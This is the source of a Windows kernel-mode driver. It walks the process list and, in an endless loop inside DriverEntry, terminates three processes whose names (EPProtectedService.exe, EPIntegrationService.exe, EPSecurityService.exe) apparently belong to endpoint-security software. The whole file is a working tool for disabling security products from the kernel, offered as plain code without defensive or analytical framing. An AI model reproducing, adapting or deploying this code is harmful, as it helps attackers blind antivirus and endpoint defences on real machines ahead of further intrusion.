#include <ntddk.h>

typedef unsigned char BYTE;


#ifndef PROCESS_TERMINATE
#define PROCESS_TERMINATE (0x0001)
#endif


#ifndef SystemProcessInformation
#define SystemProcessInformation (5)
#endif


typedef struct _SYSTEM_PROCESS_INFORMATION {
    ULONG NextEntryOffset;
    ULONG NumberOfThreads;
    LARGE_INTEGER WorkingSetPrivateSize;
    ULONG HardFaultCount;
    ULONG NumberOfThreadsHighWatermark;
    ULONGLONG CycleTime;
    LARGE_INTEGER CreateTime;
    LARGE_INTEGER UserTime;
    LARGE_INTEGER KernelTime;
    UNICODE_STRING ImageName;
    KPRIORITY BasePriority;
    HANDLE UniqueProcessId;
    HANDLE InheritedFromUniqueProcessId;
    ULONG HandleCount;
    BYTE Reserved4[4];
    ULONG SessionId;
    PVOID UniqueProcessKey;
    SIZE_T PeakVirtualSize;
    SIZE_T VirtualSize;
    ULONG PageFaultCount;
    SIZE_T PeakWorkingSetSize;
    SIZE_T WorkingSetSize;
    PVOID QuotaPagedPoolUsage;
    PVOID QuotaNonPagedPoolUsage;
    PVOID PagefileUsage;
    PVOID PeakPagefileUsage;
    PVOID PrivatePageCount;
    LONG ReadOperationCount;
    LONG WriteOperationCount;
    LONG OtherOperationCount;
    LONG ReadTransferCount;
    LONG WriteTransferCount;
    LONG OtherTransferCount;
} SYSTEM_PROCESS_INFORMATION, * PSYSTEM_PROCESS_INFORMATION;

extern "C" {
    NTSTATUS PsLookupProcessByProcessId(
        HANDLE ProcessId,
        PEPROCESS* Process
    );

    NTSTATUS ObOpenObjectByPointer(
        PVOID Object,
        ULONG HandleAttributes,
        PACCESS_STATE PassedAccessState,
        ACCESS_MASK DesiredAccess,
        POBJECT_TYPE ObjectType,
        KPROCESSOR_MODE AccessMode,
        PHANDLE Handle
    );
}


extern "C" NTSTATUS ZwQuerySystemInformation(
    ULONG InfoClass,
    PVOID Buffer,
    ULONG Length,
    PULONG ReturnLength
);

NTSTATUS FindProcessId(const WCHAR* processName, PHANDLE ProcessId) {
    NTSTATUS status;
    ULONG neededSize;
    PSYSTEM_PROCESS_INFORMATION processInfo;


    status = ZwQuerySystemInformation(SystemProcessInformation, NULL, 0, &neededSize);
    if (!NT_SUCCESS(status) && status != STATUS_INFO_LENGTH_MISMATCH) {
        return status;
    }


    processInfo = (PSYSTEM_PROCESS_INFORMATION)ExAllocatePoolWithTag(NonPagedPool, neededSize, 'Proc');
    if (!processInfo) {
        return STATUS_INSUFFICIENT_RESOURCES;
    }


    status = ZwQuerySystemInformation(SystemProcessInformation, processInfo, neededSize, &neededSize);
    if (!NT_SUCCESS(status)) {
        ExFreePoolWithTag(processInfo, 'Proc');
        return status;
    }


    PSYSTEM_PROCESS_INFORMATION currentEntry = processInfo;
    while (TRUE) {
        if (currentEntry->ImageName.Buffer != NULL) {
            if (wcscmp(processName, currentEntry->ImageName.Buffer) == 0) {
                *ProcessId = currentEntry->UniqueProcessId;
                break;
            }
        }

        if (currentEntry->NextEntryOffset == 0) {
            status = STATUS_NOT_FOUND;
            break;
        }

        currentEntry = (PSYSTEM_PROCESS_INFORMATION)((PUCHAR)currentEntry + currentEntry->NextEntryOffset);
    }

    ExFreePoolWithTag(processInfo, 'Proc');
    return status;
}

NTSTATUS TerminateProcess(HANDLE ProcessId) {
    NTSTATUS status;
    PEPROCESS Process;
    status = PsLookupProcessByProcessId(ProcessId, &Process);
    if (!NT_SUCCESS(status)) {
        return status;
    }

    HANDLE ProcessHandle;
    status = ObOpenObjectByPointer(Process, OBJ_KERNEL_HANDLE, NULL, PROCESS_TERMINATE, *PsProcessType, KernelMode, &ProcessHandle);
    if (!NT_SUCCESS(status)) {
        ObDereferenceObject(Process);
        return status;
    }

    status = ZwTerminateProcess(ProcessHandle, 0);
    ZwClose(ProcessHandle);
    ObDereferenceObject(Process);

    return status;
}

NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistryPath) {
    UNREFERENCED_PARAMETER(RegistryPath);

    HANDLE ProcessId;
    NTSTATUS status;

    while (TRUE) {  // Create an infinite loop

        status = FindProcessId(L"EPProtectedService.exe", &ProcessId);
        if (NT_SUCCESS(status)) {
            status = TerminateProcess(ProcessId);
        }


        status = FindProcessId(L"EPIntegrationService.exe", &ProcessId);
        if (NT_SUCCESS(status)) {
            status = TerminateProcess(ProcessId);
        }


        status = FindProcessId(L"EPSecurityService.exe", &ProcessId);
        if (NT_SUCCESS(status)) {
            status = TerminateProcess(ProcessId);
        }


        LARGE_INTEGER interval;
        interval.QuadPart = -(10 * 1000 * 1000);  // 1 second in 100-nanosecond intervals
        KeDelayExecutionThread(KernelMode, FALSE, &interval);
    }

    return STATUS_SUCCESS;
}
